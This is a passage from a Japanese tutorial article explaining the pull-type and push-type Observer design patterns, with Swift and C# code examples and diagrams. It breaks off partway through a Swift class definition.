</blockquote>

<p>　基本的に A が B, C, D の参照を保持するという点については変わりませんが、B, C, D に通知をする際のインターフェースが同じであるとは限りません。これは現実に例えば、友人数人と遊ぶ約束をしていて、遅刻しそうなとき、B さんは twitter、C さんは 電話、D さんはメールで連絡しなければいけないといったような状況です。</p>

<p><a href="https://camo.qiitausercontent.com/178445c5878c5594f139b7f70f3d8e81a44261f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f38663633666230302d626261362d343939352d343066312d3730333034653032353830302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/178445c5878c5594f139b7f70f3d8e81a44261f4/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f38663633666230302d626261362d343939352d343066312d3730333034653032353830302e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/56771/8f63fb00-bba6-4995-40f1-70304e025800.png"></a></p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">Notify2.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">A</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">b</span><span class="p">:</span> <span class="n">B</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">c</span><span class="p">:</span> <span class="n">C</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">d</span><span class="p">:</span> <span class="n">D</span>
    <span class="kd">public</span> <span class="kd">var</span> <span class="nv">isFine</span><span class="p">:</span> <span class="nb">Bool</span> <span class="p">=</span> <span class="kc">true</span> <span class="p">{</span>
        <span class="kr">didSet</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="n">value</span> <span class="p">{</span>
                <span class="n">b</span><span class="p">.</span><span class="n">notifyByTwitter</span><span class="p">()</span>
                <span class="n">c</span><span class="p">.</span><span class="n">notifyByTelephone</span><span class="p">()</span>
                <span class="n">d</span><span class="p">.</span><span class="n">notifyByEmail</span><span class="p">()</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="kd">public</span> <span class="kd">init</span><span class="p">(</span><span class="n">b</span><span class="p">:</span> <span class="n">B</span><span class="p">,</span> <span class="n">c</span><span class="p">:</span> <span class="n">C</span><span class="p">,</span> <span class="n">d</span><span class="p">:</span> <span class="n">D</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">b</span> <span class="p">=</span> <span class="n">b</span><span class="p">;</span> <span class="kc">self</span><span class="p">.</span><span class="n">c</span> <span class="p">=</span> <span class="n">c</span><span class="p">;</span> <span class="kc">self</span><span class="p">.</span><span class="n">d</span> <span class="p">=</span> <span class="n">d</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">B</span> <span class="p">{</span> <span class="kd">func</span> <span class="nf">notifyByTwitter</span><span class="p">()</span> <span class="p">{</span> <span class="n">NSLog</span><span class="p">(</span><span class="s">"連絡がきた"</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>
<span class="kd">class</span> <span class="nc">C</span> <span class="p">{</span> <span class="kd">func</span> <span class="nf">notifyByTelephone</span><span class="p">()</span> <span class="p">{</span> <span class="n">NSLog</span><span class="p">(</span><span class="s">"連絡がきた"</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>
<span class="kd">class</span> <span class="nc">D</span> <span class="p">{</span> <span class="kd">func</span> <span class="nf">notifyByEmail</span><span class="p">()</span> <span class="p">{</span> <span class="n">NSLog</span><span class="p">(</span><span class="s">"連絡がきた"</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="22-pull-型-observer-パターン" class="fragment"></span><a href="#22-pull-%E5%9E%8B-observer-%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3"><i class="fa fa-link"></i></a>2.2. pull 型 Observer パターン</h2>

<p>先にみた構造には、以下のような問題点があります。</p>

<ol>
<li>通知先のオブジェクトが変更されたとき、通知元の実装も変更しなければならない</li>
<li>通知先のオブジェクトの種類が増えるとき、通知元の実装も追加しなければならない</li>
</ol>

<p>　2つの問題は通知元のオブジェクトが、通知先のオブジェクトの詳細を知りすぎているということに起因しています。通知元は、通知先の参照をどうあがいても保持する必要がありますが、通知先の詳細を知ったまま保持する必要性はありません。</p>

<p>　つまり、通知元は、通知先の状態遷移を伝えるためのインターフェースだけを知っていればよいことになります。友人一般を表す <code>Friend</code> という名前で protocol を切り、通知を受け入れるメソッド <code>notify</code> を定義しておくと、B, C, D はそれぞれ下図のような構造にできるでしょう。</p>

<p><a href="https://camo.qiitausercontent.com/0c474410a6c7ad472cc85946ac1e721817f5d364/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f66316333333162302d313839342d663061632d373530362d3737653564356164313333342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0c474410a6c7ad472cc85946ac1e721817f5d364/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f66316333333162302d313839342d663061632d373530362d3737653564356164313333342e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/56771/f1c331b0-1894-f0ac-7506-77e5d5ad1334.png"></a></p>

<p>　この形にすることにより、通知元の A のほうも 友人への参照を個別の型で保持するのではなく、<code>[Friend]</code> という配列で保持することができるようになりました。配列で保持しているので <code>Friend</code> プロトコルを実装した新たなインスタンスを容易に受け入れることができる構造となりました。また配列から要素の削除も容易に行えるため、通知を取りやめることも実現できる構造になっています。</p>

<p>　A が新たな Friend のインスタンスを受け入れるメソッドを <code>subscribe</code>、逆に取り除くメソッドを <code>unsubscribe</code> と命名すると以下の図のように単純に構造を表現できます</p>

<p><a href="https://camo.qiitausercontent.com/6df26b922ca4c736f3cf315a38f9568c153330c2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f34366639366635332d623831632d313937342d616639332d3065343862313537643232662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6df26b922ca4c736f3cf315a38f9568c153330c2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f34366639366635332d623831632d313937342d616639332d3065343862313537643232662e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/56771/46f96f53-b81c-1974-af93-0e48b157d22f.png"></a></p>

<p>　ここまでの検討をまとめれば「通知元の状態変化を、複数の通知先に伝えたい」場合に、通知元と通知先が持っていてほしいインターフェース仕様が導けるでしょう。それぞれ次のようになります。</p>

<ul>
<li>通知元（Observable=観測可能なオブジェクト）は次の2つのメソッドを持っていてほしい

<ul>
<li>通知先（Observer=観測者）への通知を開始するためのメソッド（subscribe）</li>
<li>通知先（Observer=観測者）への通知を終了するためのメソッド（unsubscribe）</li>
</ul>
</li>
<li>通知先（Obseerver=観測者）は次の1つのメソッドを持っていてほしい

<ul>
<li>通知を受け付けるメソッド（notify）</li>
</ul>
</li>
</ul>

<p>クラス図にまとめると以下のような形になります。</p>

<p><a href="https://camo.qiitausercontent.com/6d4439cd2fee3c350f3222dcfcc8ac75854ecd35/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f38373131343532382d343834332d666462632d633063352d3366386561346262343763382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/6d4439cd2fee3c350f3222dcfcc8ac75854ecd35/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f38373131343532382d343834332d666462632d633063352d3366386561346262343763382e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/56771/87114528-4843-fdbc-c0c5-3f8ea4bb47c8.png"></a></p>

<p>この構造は、<strong>pull型 Observer パターン<sup id="fnref1"><a href="#fn1" rel="footnote" title="Erich Gamma, Richard Helm, Ralph Johnson, John Vlissides (1994). Design Patterns: Elements of Reusable Object-Oriented Software.">1</a></sup></strong>と呼ばれています。Swiftで表現すると、やや制約のあるコードですが以下のように表現できます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">PullObserver.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">protocol</span> <span class="nc">Observable</span> <span class="p">{</span>
    <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">(</span><span class="n">obs</span><span class="p">:</span> <span class="n">Observer</span><span class="p">)</span>
    <span class="kd">func</span> <span class="nf">unsubscribe</span><span class="p">(</span><span class="n">obs</span><span class="p">:</span> <span class="n">Observer</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ConcreteObservable</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">observers</span><span class="p">:</span> <span class="p">[</span><span class="n">Observer</span><span class="p">]</span> <span class="p">=</span> <span class="p">[]</span>
    <span class="kd">public</span> <span class="kd">var</span> <span class="nv">isHoge</span><span class="p">:</span> <span class="nb">Bool</span> <span class="p">=</span> <span class="kc">false</span> <span class="p">{</span>
        <span class="kr">didSet</span> <span class="p">{</span> <span class="n">observers</span><span class="p">.</span><span class="n">forEach</span> <span class="p">{</span> <span class="n">x</span> <span class="k">in</span> <span class="n">x</span><span class="p">.</span><span class="n">notify</span><span class="p">()</span> <span class="p">}</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">(</span><span class="n">obs</span><span class="p">:</span> <span class="n">Observer</span><span class="p">)</span> <span class="p">{</span> <span class="n">observers</span> <span class="o">+=</span> <span class="p">[</span><span class="n">obs</span><span class="p">]</span> <span class="p">}</span>
    <span class="n">pubilc</span> <span class="kd">func</span> <span class="nf">unsubscribe</span><span class="p">(</span><span class="n">obs</span><span class="p">:</span> <span class="n">Observer</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">observers</span> <span class="p">=</span> <span class="n">observers</span><span class="p">.</span><span class="bp">filter</span> <span class="p">{</span> <span class="n">x</span> <span class="k">in</span>
            <span class="c1">// this means reference equality</span>
            <span class="nb">ObjectIdentifier</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">ObjectIdentifier</span><span class="p">(</span><span class="n">obs</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">protocol</span> <span class="nc">Observer</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="kd">func</span> <span class="nf">notify</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ConcreteObserver</span><span class="p">:</span> <span class="n">Observer</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">notify</span><span class="p">()</span> <span class="p">{</span> <span class="n">NSLog</span><span class="p">(</span><span class="s">"通知を受けた"</span><span class="p">)</span> <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// 以下のように playground でお試しできます</span>
<span class="kd">let</span> <span class="nv">v1</span> <span class="p">=</span> <span class="n">ConcreteObservable</span><span class="p">()</span>
<span class="kd">let</span> <span class="nv">obs1</span> <span class="p">=</span> <span class="n">ConcreteObserver</span><span class="p">()</span>
<span class="n">v1</span><span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">obs</span><span class="p">:</span> <span class="n">obs1</span><span class="p">)</span>
<span class="n">v1</span><span class="p">.</span><span class="n">isHoge</span> <span class="p">=</span> <span class="kc">false</span> <span class="c1">//=&gt; ログ出力される</span>
<span class="n">v1</span><span class="p">.</span><span class="n">isHoge</span> <span class="p">=</span> <span class="kc">true</span>  <span class="c1">//=&gt; ログ出力される</span>
<span class="n">v1</span><span class="p">.</span><span class="n">unsubscribe</span><span class="p">(</span><span class="n">obs</span><span class="p">:</span> <span class="n">obs1</span><span class="p">)</span>
<span class="n">v1</span><span class="p">.</span><span class="n">isHoge</span> <span class="p">=</span> <span class="kc">false</span> <span class="c1">//=&gt; ログ出力されない</span>
</pre></div>
</div>

<p>　C# で表現すると以下のようなコードになります。C#を読んだことがない方でも、言語の違いを飛び越えてほぼ同じような表現が可能であることがわかるのではないでしょうか。</p>

<div class="code-frame" data-lang="csharp">
<div class="code-lang"><span class="bold">PullObserver.cs</span></div>
<div class="highlight"><pre><span></span><span class="k">namespace</span> <span class="nn">DotNetObservable</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">interface</span> <span class="n">IObservable</span>
    <span class="p">{</span>
        <span class="k">void</span> <span class="nf">Subscribe</span><span class="p">(</span><span class="n">IObserver</span> <span class="n">obs</span><span class="p">);</span>
        <span class="k">void</span> <span class="nf">Unsubscribe</span><span class="p">(</span><span class="n">IObserver</span> <span class="n">obs</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">class</span> <span class="nc">ConcreteObservable</span> <span class="p">:</span> <span class="n">IObservable</span>
    <span class="p">{</span>
        <span class="k">readonly</span> <span class="n">IList</span><span class="p">&lt;</span><span class="n">IObserver</span><span class="p">&gt;</span> <span class="n">observers</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="n">IObserver</span><span class="p">&gt;();</span>
        <span class="kt">bool</span> <span class="n">isHoge</span><span class="p">;</span>
        <span class="kt">bool</span> <span class="n">IsHoge</span>
        <span class="p">{</span>
            <span class="k">get</span> <span class="p">=&gt;</span> <span class="n">isHoge</span><span class="p">;</span>
            <span class="k">set</span>
            <span class="p">{</span>
                <span class="n">isHoge</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="kt">var</span> <span class="n">obs</span> <span class="k">in</span> <span class="n">observers</span><span class="p">)</span> <span class="n">obs</span><span class="p">.</span><span class="n">Notify</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">void</span> <span class="nf">Subscribe</span><span class="p">(</span><span class="n">IObserver</span> <span class="n">obs</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">observers</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">obs</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">void</span> <span class="nf">Unsubscribe</span><span class="p">(</span><span class="n">IObserver</span> <span class="n">obs</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">observers</span><span class="p">.</span><span class="n">Remove</span><span class="p">(</span><span class="n">obs</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">interface</span> <span class="n">IObserver</span>
    <span class="p">{</span>
        <span class="k">void</span> <span class="nf">Notify</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">class</span> <span class="nc">ConcreteObserver</span> <span class="p">:</span> <span class="n">IObserver</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="k">void</span> <span class="nf">Notify</span><span class="p">()</span> <span class="p">=&gt;</span> <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"通知された"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h3>
<span id="pull-型-observer-パターンについてのまとめ" class="fragment"></span><a href="#pull-%E5%9E%8B-observer-%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>pull 型 Observer パターンについてのまとめ</h3>

<p>やや長くなったので、ここで pull 型 Observer パターンについてまとめておきましょう。pull 型Observerパターンは、「複数の異なる通知先に状態変化を通知したい」という問題の解決策として以下のような構造や特徴を持ちます。</p>

<ol>
<li>通知元（Observable）は、通知先（Observer）に共通したプロトコルを持つインスタンスをコレクションとして持ち、状態遷移時にそれぞれに通知する</li>
<li>
<code>Observer</code> は、 <code>Observable</code> からなんらかの変化が発生したという情報だけを <code>notify()</code> メソッド経由で受け取れる</li>
<li>
<code>Observer</code> は、必要に応じて <code>Observable</code> の値を問い合わせる（このあたりが pull 型と呼ばれる所以）</li>
</ol>

<h2>
<span id="23-push-型-observer-パターン" class="fragment"></span><a href="#23-push-%E5%9E%8B-observer-%E3%83%91%E3%82%BF%E3%83%BC%E3%83%B3"><i class="fa fa-link"></i></a>2.3. push 型 Observer パターン</h2>

<p>　pull 型の Observer パターンを用いた場合、<code>Observer</code> は <code>Observable</code> の状態が更新されたという事実を知ることができますが、どのような値に更新されたのかは、 <code>Observable</code> のプロパティなどを参照しにいかなければ知ることができません。したがって、現実的には更新された値を参照するために、<code>Observer</code> も <code>Observable</code> の参照を何らかの方法で取得できる状況にする必要があり、相互参照する構造になってしまいます。</p>

<p>　この問題を解決するために、<code>notify</code> 時に更新後の値を渡してしまう構造にしたものが <strong>push 型 Observer パターン</strong> になります。構造は以下のようになります。</p>

<p><a href="https://camo.qiitausercontent.com/60dc9bc8665a7cf404ec89b282144836615d4f6b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f62663162326636302d643230362d663863612d343264312d3031626535346234663439382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/60dc9bc8665a7cf404ec89b282144836615d4f6b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f62663162326636302d643230362d663863612d343264312d3031626535346234663439382e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/56771/bf1b2f60-d206-f8ca-42d1-01be54b4f498.png"></a></p>

<p>　図中で interface が<strong>型パラメータ（generic type parameter）</strong>を持つ箇所がありますが、Swift の protocol は型パラメータを持てず、<strong>関連型（associated type, abstract type member）</strong> しかもてない仕様があり<sup id="fnref2"><a href="#fn2" rel="footnote" title="https://developer.apple.com/library/content/documentation/Swift/Conceptual/Swift_Programming_Language/Generics.html">2</a></sup>、この図をストレートにコードに落とし込むことができません。したがって、ひとまず C# で表現するならば以下のようなコードになります。</p>

<div class="code-frame" data-lang="csharp">
<div class="code-lang"><span class="bold">PushObserver.cs</span></div>
<div class="highlight"><pre><span></span><span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">DotNetObservable</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">interface</span> <span class="n">IObservable</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;</span>
    <span class="p">{</span>
        <span class="k">void</span> <span class="nf">Subscribe</span><span class="p">(</span><span class="n">IObserver</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;</span> <span class="n">obs</span><span class="p">);</span>
        <span class="k">void</span> <span class="nf">Unsubscribe</span><span class="p">(</span><span class="n">IObserver</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;</span> <span class="n">obs</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">class</span> <span class="nc">BooleanObservable</span> <span class="p">:</span> <span class="n">IObservable</span><span class="p">&lt;</span><span class="kt">bool</span><span class="p">&gt;</span>
    <span class="p">{</span>
        <span class="k">readonly</span> <span class="n">IList</span><span class="p">&lt;</span><span class="n">IObserver</span><span class="p">&lt;</span><span class="kt">bool</span><span class="p">&gt;&gt;</span> <span class="n">observers</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="n">IObserver</span><span class="p">&lt;</span><span class="kt">bool</span><span class="p">&gt;&gt;();</span>
        <span class="kt">bool</span> <span class="n">t</span><span class="p">;</span>
        <span class="kt">bool</span> <span class="n">TValue</span>
        <span class="p">{</span>
            <span class="k">get</span> <span class="p">=&gt;</span> <span class="n">t</span><span class="p">;</span>
            <span class="k">set</span>
            <span class="p">{</span>
                <span class="n">t</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
                <span class="k">foreach</span> <span class="p">(</span><span class="kt">var</span> <span class="n">obs</span> <span class="k">in</span> <span class="n">observers</span><span class="p">)</span> <span class="n">obs</span><span class="p">.</span><span class="n">Notify</span><span class="p">(</span><span class="k">value</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">void</span> <span class="nf">Subscribe</span><span class="p">(</span><span class="n">IObserver</span><span class="p">&lt;</span><span class="kt">bool</span><span class="p">&gt;</span> <span class="n">obs</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">observers</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">obs</span><span class="p">);</span>
        <span class="k">public</span> <span class="k">void</span> <span class="nf">Unsubscribe</span><span class="p">(</span><span class="n">IObserver</span><span class="p">&lt;</span><span class="kt">bool</span><span class="p">&gt;</span> <span class="n">obs</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">observers</span><span class="p">.</span><span class="n">Remove</span><span class="p">(</span><span class="n">obs</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">interface</span> <span class="n">IObserver</span><span class="p">&lt;</span><span class="n">T</span><span class="p">&gt;</span>
    <span class="p">{</span>
        <span class="k">void</span> <span class="nf">Notify</span><span class="p">(</span><span class="n">T</span> <span class="n">t</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">class</span> <span class="nc">BooleanObserver</span> <span class="p">:</span> <span class="n">IObserver</span><span class="p">&lt;</span><span class="kt">bool</span><span class="p">&gt;</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="k">void</span> <span class="nf">Notify</span><span class="p">(</span><span class="kt">bool</span> <span class="n">t</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"通知された"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>Swift で表現するならば、ちょっと迂回して以下の図のような構造となるでしょう。</p>

<p><a href="https://camo.qiitausercontent.com/ba191ab05b9a7b8e0f00f5074f3ec497558f48b2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f33643966646432352d316236372d313835652d333137372d3465613866333734363961322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/ba191ab05b9a7b8e0f00f5074f3ec497558f48b2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f35363737312f33643966646432352d316236372d313835652d333137372d3465613866333734363961322e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/56771/3d9fdd25-1b67-185e-3177-4ea8f37469a2.png"></a></p>

<p>　Swiftには抽象クラスというものは存在しませんが、擬似的に abstract method 内 で <code>fatalError()</code> を返すことを抽象クラスである印として、次のようにコードに落とし込めます。この技法は RxSwift のコード内部でも使われています<sup id="fnref3"><a href="#fn3" rel="footnote" title="https://github.com/ReactiveX/RxSwift/blob/007af77912b39d84857a8e90eecdd02dd20164de/RxSwift/Rx.swift#L36">3</a></sup>。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">PushObserver.swift</span></div>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">protocol</span> <span class="nc">ObserverType</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="n">associatedtype</span> <span class="n">E</span>
    <span class="kd">func</span> <span class="nf">notify</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="n">E</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">protocol</span> <span class="nc">ObseravbleType</span> <span class="p">{</span>
    <span class="n">associatedtype</span> <span class="n">E</span>
    <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">:</span> <span class="n">ObserverType</span><span class="p">&gt;(</span><span class="n">obs</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="k">where</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">E</span>
    <span class="kd">func</span> <span class="nf">unsubscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">:</span> <span class="n">ObserverType</span><span class="p">&gt;(</span><span class="n">obs</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="k">where</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">E</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Observable</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;:</span> <span class="n">ObseravbleType</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">typealias</span> <span class="n">E</span> <span class="p">=</span> <span class="n">Element</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">:</span> <span class="n">ObserverType</span><span class="p">&gt;(</span><span class="n">obs</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="k">where</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">E</span> <span class="p">{</span>
        <span class="bp">fatalError</span><span class="p">(</span><span class="s">"not implemented"</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="kd">public</span> <span class="kd">func</span> <span class="nf">unsubscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">:</span> <span class="n">ObserverType</span><span class="p">&gt;(</span><span class="n">obs</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="k">where</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="n">E</span> <span class="p">{</span>
        <span class="bp">fatalError</span><span class="p">(</span><span class="s">"not implemented"</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">BooleanObservable</span><span class="p">:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="nb">Bool</span><span class="p">&gt;</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">observers</span><span class="p">:</span> <span class="p">[</span><span class="nb">ObjectIdentifier</span><span class="p">:</span><span class="n">AnonymousObserver</span><span class="p">&lt;</span><span class="nb">Bool</span><span class="p">&gt;]</span> <span class="p">=</span> <span class="p">[:]</span>
    <span class="kd">public</span> <span class="kd">var</span> <span class="nv">isHoge</span><span class="p">:</span> <span class="nb">Bool</span> <span class="p">=</span> <span class="kc">false</span> <span class="p">{</span> 
        <span class="kr">didSet</span> <span class="p">{</span> <span class="n">observers</span><span class="p">.</span><span class="n">forEach</span> <span class="p">{</span> <span class="n">x</span> <span class="k">in</span> <span class="n">x</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">notify</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="n">isHoge</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="kd">public</span> <span class="kr">override</span> <span class="kd">func</span> <span class="nf">subscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">&gt;(</span><span class="n">obs</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="k">where</span> <span class="n">O</span> <span class="p">:</span> <span class="n">ObserverType</span><span class="p">,</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="n">observers</span><span class="p">[</span><span class="nb">ObjectIdentifier</span><span class="p">(</span><span class="n">obs</span><span class="p">)]</span> <span class="p">=</span> <span class="n">AnonymousObserver</span><span class="p">(</span><span class="n">handler</span><span class="p">:</span> <span class="n">obs</span><span class="p">.</span><span class="n">notify</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">public</span> <span class="kr">override</span> <span class="kd">func</span> <span class="nf">unsubscribe</span><span class="p">&lt;</span><span class="n">O</span><span class="p">&gt;(</span><span class="n">obs</span><span class="p">:</span> <span class="n">O</span><span class="p">)</span> <span class="k">where</span> <span class="n">O</span> <span class="p">:</span> <span class="n">ObserverType</span><span class="p">,</span> <span class="n">O</span><span class="p">.</span><span class="n">E</span> <span class="p">==</span> <span class="nb">Bool</span> <span class="p">{</span>
        <span class="n">observers</span><span class="p">[</span><span class="nb">ObjectIdentifier</span><span class="p">(</span><span class="n">obs</span><span class="p">)]</span> <span class="p">=</span> <span class="kc">nil</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AnonymousObserver</span><span class="p">&lt;</span><span class="n">Element</span><span class="p">&gt;:</span> <span class="n">ObserverType</span> <span class="p">{</span>
    <span class="kd">public</span> <span class="kd">typealias</span> <span class="n">E</span> <span class="p">=</span> <span class="n">Element</span>
    <span class="kd">public</span> <span class="kd">typealias</span> <span class="n">Handler</span> <span class="p">=</span> <span class="p">(</span><span class="n">E</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="nb">Void</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">handler</span><span class="p">:</span> <span class="n">Handler</span>

    <span class="kd">public</span> <span class="kd">init</span><span class="p">(</span><span class="n">handler</span><span class="p">:</span> <span class="p">@</span><span class="n">escaping</span> <span class="n">Handler</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">handler</span> <span class="p">=</span> <span class="n">handler</span>
    <span class="p">}</span>
